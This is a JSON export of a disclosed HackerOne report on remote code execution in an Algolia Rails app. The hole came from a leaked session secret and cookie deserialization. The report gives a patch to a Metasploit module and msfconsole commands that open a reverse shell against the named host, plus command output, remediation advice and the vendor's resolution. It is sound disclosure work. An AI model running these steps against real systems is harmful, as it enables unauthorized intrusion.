{"id":134321,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQzMjE=","url":"https://hackerone.com/reports/134321","title":"RCE on facebooksearch.algolia.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-25T05:47:36.506Z","submitted_at":"2016-04-25T05:47:36.506Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"michiel","url":"/michiel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":443,"url":"https://hackerone.com/algolia","handle":"algolia","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Algolia","twitter_handle":"algolia","website":"https://algolia.com","about":"Hosted search API that delivers instant and relevant results from the first keystroke"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-10-01T15:24:10.322Z","bug_reporter_agreed_on_going_public_at":"2016-09-01T15:23:52.927Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.\n\nCookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. \n\n# Where did I find the session secret?\nI used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. \n\nThe token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\n\n# Proof of Concept\n@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\n\nSince the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: \n\n```diff\n     if res \u0026\u0026 !res.get_cookies.empty?\n-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n     end\n```\n\nWith that patch applied, you can run the PoC from `msfconsole` by following these commands:\n\n```bash\n# setting up\nuse exploit/multi/http/rails_secret_deserialization\nset secret \"\u003cgrab-from-github-url\u003e\"\nset rhost facebooksearch.algolia.com\nset railsversion 4\nset targeturi /auth/facebook\n\n# and then run\nexploit\n\n# when successful, a reverse shell will be established\n# this allows you to run arbitrary commands\n```\n\nAs a proof of concept, I ran `id`:\n\n```\nid\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n```\n\nBut since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text \"PoC by michiel\" to proof regular write access is possible as well. \n\n# Remediation\nSwitch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history. \n\n","vulnerability_information_html":"\u003cp\u003eWhile doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a \u003cstrong\u003epublic\u003c/strong\u003e GitHub repository. Since the Rails app running at \u003ccode\u003efacebooksearch.algolia.com\u003c/code\u003e is using \u003ccode\u003eCookieStore\u003c/code\u003e as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.\u003c/p\u003e\n\n\u003cp\u003eCookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: \u003ca title=\"https://charlie.bz/blog/rails-3.2.10-remote-code-execution\" href=\"/redirect?url=https%3A%2F%2Fcharlie.bz%2Fblog%2Frails-3.2.10-remote-code-execution\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://charlie.bz/blog/rails-3.2.10-remote-code-execution\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003ch1 id=\"where-did-i-find-the-session-secret\"\u003eWhere did I find the session secret?\u003c/h1\u003e\n\n\u003cp\u003eI used \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmichenriksen%2Fgitrob\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGitrob\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to scan all of Algolia\u0026#39;s public repositories (plus repositories from employees) and extract everything that is interesting. The \u003ccode\u003esecret_token.rb\u003c/code\u003e initializer immediately caught my attention since it usually contains the \u003ccode\u003esecret_key_base\u003c/code\u003e, which should never be public. \u003c/p\u003e\n\n\u003cp\u003eThe token can be found here: \u003ca title=\"https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Falgolia%2Ffacebook-search%2Fcommit%2Ff3adccb5532898f8088f90eb57cf991e2d499b49%23diff-afe98573d9aad940bb0f531ea55734f8R12\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h1\u003e\n\n\u003cp\u003e\u003ca href=\"/joernchen\"\u003e@joernchen\u003c/a\u003e developed a ready to go proof of concept for this vulnerability and submitted it to the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.darkoperator.com%2Finstalling-metasploit-in-ubunt%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMetasploit Framework\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e: \u003ca title=\"https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fmulti%2Fhttp%2Frails_secret_deserialization.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSince the version of the exploit doesn\u0026#39;t take cookies with \u003ccode\u003e-\u003c/code\u003e into account, here is a small patch to allow the exploit to work on the \u003ccode\u003e_facebook-search_session\u003c/code\u003e cookie. Here\u0026#39;s the patch for the exploit: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e     if res \u0026amp;\u0026amp; !res.get_cookies.empty?\n\u003cspan class=\"gd\"\u003e-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n\u003c/span\u003e     end\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith that patch applied, you can run the PoC from \u003ccode\u003emsfconsole\u003c/code\u003e by following these commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e# setting up\u003c/span\u003e\nuse exploit/multi/http/rails_secret_deserialization\n\u003cspan class=\"nb\"\u003eset \u003c/span\u003esecret \u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;grab-from-github-url\u0026gt;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eset \u003c/span\u003erhost facebooksearch.algolia.com\n\u003cspan class=\"nb\"\u003eset \u003c/span\u003erailsversion 4\n\u003cspan class=\"nb\"\u003eset \u003c/span\u003etargeturi /auth/facebook\n\n\u003cspan class=\"c\"\u003e# and then run\u003c/span\u003e\nexploit\n\n\u003cspan class=\"c\"\u003e# when successful, a reverse shell will be established\u003c/span\u003e\n\u003cspan class=\"c\"\u003e# this allows you to run arbitrary commands\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs a proof of concept, I ran \u003ccode\u003eid\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eid\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut since that is very generic, I also created \u003ca title=\"http://facebooksearch.algolia.com/hackerone.txt\" href=\"/redirect?url=http%3A%2F%2Ffacebooksearch.algolia.com%2Fhackerone.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://facebooksearch.algolia.com/hackerone.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with the text \u0026quot;PoC by michiel\u0026quot; to proof regular write access is possible as well. \u003c/p\u003e\n\n\u003ch1 id=\"remediation\"\u003eRemediation\u003c/h1\u003e\n\n\u003cp\u003eSwitch \u003ccode\u003econfig/initializers/secret_token.rb\u003c/code\u003e to use an environment variable (e.g. \u003ccode\u003eENV[\u0026#39;SECRET_KEY_BASE\u0026#39;]\u003c/code\u003e). You must also generate a new token because the current secret is compromised. A new secret can be generated by running \u003ccode\u003erake secret\u003c/code\u003e from the command line. Make sure the new secret does not leak in git commit history. \u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-10-01T15:23:53.070Z","allow_singular_disclosure_after":-133880508.43524116,"singular_disclosure_allowed":true,"vote_count":67,"voters":["derision","hunter","michiel","dawgyg","bogdantcaciuc","spam404","sameerphad72","yaworsk","koenrh","mak","and 57 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":925512,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I now realize the file I created - http://facebooksearch.algolia.com/hackerone.txt - is gone again. Maybe there are multiple app servers and I created the file on only one app server? (Look in `public/` for a file called `hackerone.txt`.)","markdown_message":"\u003cp\u003eI now realize the file I created - \u003ca title=\"http://facebooksearch.algolia.com/hackerone.txt\" href=\"/redirect?url=http%3A%2F%2Ffacebooksearch.algolia.com%2Fhackerone.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://facebooksearch.algolia.com/hackerone.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - is gone again. Maybe there are multiple app servers and I created the file on only one app server? (Look in \u003ccode\u003epublic/\u003c/code\u003e for a file called \u003ccode\u003ehackerone.txt\u003c/code\u003e.)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T05:57:18.176Z","updated_at":"2016-04-25T05:57:18.176Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925515,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report. We investigate.","markdown_message":"\u003cp\u003eThank you for the report. We investigate.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T05:59:06.517Z","updated_at":"2016-04-25T05:59:06.517Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":925534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The linked blog is dead. Here's a similar post explaining the concept: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/. \n\nLet me know if you need anything else. ","markdown_message":"\u003cp\u003eThe linked blog is dead. Here\u0026#39;s a similar post explaining the concept: \u003ca title=\"http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/\" href=\"/redirect?url=http%3A%2F%2Frobertheaton.com%2F2013%2F07%2F22%2Fhow-to-hack-a-rails-app-using-its-secret-token%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eLet me know if you need anything else. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T06:36:34.241Z","updated_at":"2016-04-25T06:36:34.241Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925551,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the update @michiel","markdown_message":"\u003cp\u003eThank you for the update \u003ca href=\"/michiel\"\u003e@michiel\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T06:52:52.044Z","updated_at":"2016-04-25T06:52:52.044Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":925555,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I confirm the file is present. Since there are multiple servers running the app, the request might not show it every time.","markdown_message":"\u003cp\u003eI confirm the file is present. Since there are multiple servers running the app, the request might not show it every time.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T06:59:08.517Z","updated_at":"2016-04-25T06:59:08.517Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":926385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I noticed you took down the website temporarily as a precaution. Good!","markdown_message":"\u003cp\u003eI noticed you took down the website temporarily as a precaution. Good!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-25T16:23:35.208Z","updated_at":"2016-04-25T16:23:35.208Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":927807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, it was an old application that we did not maintain anymore and it turned out to be the weak spot.","markdown_message":"\u003cp\u003eYes, it was an old application that we did not maintain anymore and it turned out to be the weak spot.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-26T07:31:20.881Z","updated_at":"2016-04-26T07:31:20.881Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":933377,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"After a discussion with the dev team, it has been decided that the application will stay down. We have checked all our other Rails applications and those are safe. Thank you for your help, it's much appreciated.","markdown_message":"\u003cp\u003eAfter a discussion with the dev team, it has been decided that the application will stay down. We have checked all our other Rails applications and those are safe. Thank you for your help, it\u0026#39;s much appreciated.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-29T10:25:25.766Z","updated_at":"2016-04-29T10:25:25.766Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"michiel","url":"/michiel"},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":933730,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for addressing the problem so fast! Is this in scope for the bounty program?","markdown_message":"\u003cp\u003eThank you for addressing the problem so fast! Is this in scope for the bounty program?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-29T15:19:37.790Z","updated_at":"2016-04-29T15:19:37.790Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":933745,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Yes. Although the bug is out of scope of our program, we have decided to award a bounty. Thank you for your help!","markdown_message":"\u003cp\u003eYes. Although the bug is out of scope of our program, we have decided to award a bounty. Thank you for your help!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-29T15:27:55.242Z","updated_at":"2016-04-29T15:27:55.242Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Algolia"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"algolia","collaborator":{"username":"michiel","url":"/michiel"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1167690,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since you guys handled this report so well and fast, I'd like to disclose this report and show how well the @algolia team handles vuln reports. Do you mind public disclosure? ","markdown_message":"\u003cp\u003eSince you guys handled this report so well and fast, I\u0026#39;d like to disclose this report and show how well the \u003ca href=\"/algolia\"\u003e@algolia\u003c/a\u003e team handles vuln reports. Do you mind public disclosure? \u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-01T15:23:52.989Z","updated_at":"2016-09-01T15:23:52.989Z","first_to_agree":true,"actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1227464,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-01T15:24:10.343Z","updated_at":"2016-10-01T15:24:10.343Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Algolia"}},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}